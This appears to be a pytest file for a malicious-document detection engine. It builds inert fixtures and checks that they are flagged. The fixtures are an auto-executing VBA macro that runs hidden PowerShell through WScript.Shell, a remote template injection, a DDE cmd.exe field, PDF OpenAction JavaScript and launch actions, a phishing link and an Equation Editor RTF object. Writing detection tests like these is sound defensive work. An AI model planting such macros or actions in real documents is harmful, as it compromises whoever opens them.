"""PDF, Office (OOXML / OLE / VBA) and RTF inspection on synthetic, inert fixtures."""
from __future__ import annotations

import pytest

from detection.engine import inspect_content
from detection.ole import OleError, OleFile, decompress_vba, extract_vba_sources
from detection_fixtures import (
    BENIGN_PDF_OBJECTS, make_cfb, make_docx, make_pdf, make_vba_project, pdf_stream, vba_compress, vba_dir_stream,
)

DROPPER_MACRO = (
    'Attribute VB_Name = "Module1"\r\n'
    "Sub AutoOpen()\r\n"
    '  Set shell = CreateObject("WScript.Shell")\r\n'
    '  shell.Run "powershell -w hidden -c calc"\r\n'
    "End Sub\r\n"
)
HARMLESS_MACRO = 'Attribute VB_Name = "Module1"\r\nSub FormatTable()\r\n  Selection.Font.Bold = True\r\nEnd Sub\r\n'


def labels(result):
    return {item.label for item in result["indicators"] if item.category != "privacy"}


# --- VBA / OLE -------------------------------------------------------------------------------

def test_vba_decompression_round_trip_and_spec_example():
    assert decompress_vba(vba_compress(DROPPER_MACRO.encode())) == DROPPER_MACRO.encode()
    # Hand-derived vector: literals "abc", then one copy token (offset 3, length 6) that overlaps its
    # own output. Flag byte 0x08 marks token 4 as a copy; token = ((3-1) << 12) | (6-3) = 0x2003.
    assert decompress_vba(bytes.fromhex("01 05 B0 08 61 62 63 03 20")) == b"abcabcabc"
    with pytest.raises(OleError):
        decompress_vba(bytes.fromhex("01 05 B0 01 03 20 61 62 63"))  # copy token before any literal


def test_vba_source_is_recovered_from_compound_file():
    ole = OleFile(make_vba_project(DROPPER_MACRO))
    sources = extract_vba_sources(ole)
    assert sources and "AutoOpen" in sources[0]["code"]


def test_auto_executing_dropper_macro_is_critical():
    result = inspect_content(make_vba_project(DROPPER_MACRO), "vbaProject.bin")
    assert "Auto-executing macro with dangerous capabilities" in labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_harmless_macro_is_reported_but_not_suspicious():
    result = inspect_content(make_vba_project(HARMLESS_MACRO), "vbaProject.bin")
    assert "VBA macros present" in labels(result)
    assert result["classification"] == "UNKNOWN"


def test_legacy_word_document_with_macro():
    doc = make_cfb({"WordDocument": b"\x00" * 600,
                    "Macros": {"VBA": {"dir": vba_dir_stream("Module1"), "Module1": vba_compress(DROPPER_MACRO.encode())}}})
    result = inspect_content(doc, "invoice.doc")
    assert result["file_type"] == "word"
    assert result["classification"] == "SUSPICIOUS"


def test_encrypted_office_document_is_flagged_as_uninspectable():
    result = inspect_content(make_cfb({"EncryptionInfo": b"\x04\x00" * 100, "EncryptedPackage": b"\x00" * 5000}), "a.docx")
    assert "Password-protected Office document" in labels(result)


@pytest.mark.parametrize("blob", [b"", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" + b"\xff" * 600])
def test_malformed_ole_raises_only_ole_error(blob):
    with pytest.raises(OleError):
        OleFile(blob)
    assert inspect_content(blob, "x.doc")["analyzer_errors"] == []


# --- OOXML -----------------------------------------------------------------------------------

def test_benign_docx_is_safe_and_metadata_extracted():
    result = inspect_content(make_docx(), "report.docx")
    assert result["score"] == 0
    assert result["details"]["metadata"]["creator"] == "Test Author"


def test_macro_enabled_document():
    result = inspect_content(make_docx(extra={"word/vbaProject.bin": make_vba_project(DROPPER_MACRO)}), "a.docm")
    assert result["classification"] == "SUSPICIOUS"


def test_macro_hidden_in_macro_free_extension():
    result = inspect_content(make_docx(extra={"word/vbaProject.bin": make_vba_project(HARMLESS_MACRO)}), "a.docx")
    assert "Macro project in a macro-free file type" in labels(result)


def test_remote_template_injection():
    rels = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://203.0.113.5/t.dotm" TargetMode="External"/></Relationships>')
    result = inspect_content(make_docx(extra={"word/_rels/settings.xml.rels": rels}), "a.docx")
    assert "Remote template injection" in labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_dde_field_split_across_runs_is_detected():
    xml = ('<w:document><w:body><w:p><w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\windows\\cmd.exe'
           '</w:instrText></w:r></w:p></w:body></w:document>')
    assert "DDE field (command execution)" in labels(inspect_content(make_docx(xml), "a.docx"))


def test_ordinary_external_hyperlink_is_not_suspicious():
    rels = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="https://www.example.com/report" TargetMode="External"/></Relationships>')
    assert inspect_content(make_docx(extra={"word/_rels/document.xml.rels": rels}), "a.docx")["score"] == 0


def test_xlm_macro_sheet():
    assert "Excel 4.0 (XLM) macro sheet" in labels(inspect_content(make_docx(extra={"xl/macrosheets/sheet1.xml": "<x/>"}), "a.xlsx"))


# --- PDF -------------------------------------------------------------------------------------

def test_benign_pdf_is_safe():
    result = inspect_content(make_pdf(BENIGN_PDF_OBJECTS), "notes.pdf")
    assert result["file_type"] == "pdf" and result["score"] == 0


def test_javascript_hidden_in_compressed_stream_is_found():
    js = pdf_stream(b"<< /S /JavaScript /JS (eval(unescape('%u0c0c%u0c0c'))) >>", compress=True)
    pdf = make_pdf([b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>", *BENIGN_PDF_OBJECTS[1:], js])
    assert b"/JavaScript" not in pdf  # only visible after inflating the stream
    result = inspect_content(pdf, "a.pdf")
    assert {"PDF auto-executes JavaScript", "Suspicious JavaScript functions in PDF"} <= labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_hex_obfuscated_pdf_names_are_decoded():
    pdf = make_pdf([b"<< /Type /Catalog /OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >> >>", *BENIGN_PDF_OBJECTS[1:]])
    assert {"Obfuscated PDF name objects", "PDF auto-executes JavaScript"} <= labels(inspect_content(pdf, "a.pdf"))


def test_pdf_launch_action_and_embedded_executable():
    pdf = make_pdf([b"<< /Type /Catalog /OpenAction << /S /Launch /Win << /F (cmd.exe) >> >> >>",
                    b"<< /Type /Filespec /F (update.exe) /EF << /F 3 0 R >> >>", b"<< /Type /EmbeddedFile >>"])
    assert {"PDF launch action", "PDF embeds an executable file"} <= labels(inspect_content(pdf, "a.pdf"))


def test_pdf_phishing_link():
    annot = b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://paypal-secure-login.example-verify.top/signin) >> >>"
    result = inspect_content(make_pdf(BENIGN_PDF_OBJECTS + [annot]), "a.pdf")
    assert "Suspicious link in document" in labels(result)


def test_pdf_ordinary_link_is_not_flagged():
    annot = b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://www.example.com/docs) >> >>"
    assert inspect_content(make_pdf(BENIGN_PDF_OBJECTS + [annot]), "a.pdf")["score"] == 0


# --- RTF -------------------------------------------------------------------------------------

def test_rtf_equation_editor_exploit_shape():
    rtf = rb"{\rtf1{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 0105000002000000 0b000000 4571756174696f6e2e3300}}}"
    result = inspect_content(rtf, "a.rtf")
    assert result["file_type"] == "rtf"
    assert {"Equation Editor object", "RTF embedded OLE object with auto-update"} <= labels(result)
    assert result["classification"] == "SUSPICIOUS"


def test_plain_rtf_is_safe():
    assert inspect_content(rb"{\rtf1\ansi\deff0 {\fonttbl {\f0 Arial;}} Hello world.}", "a.rtf")["score"] == 0
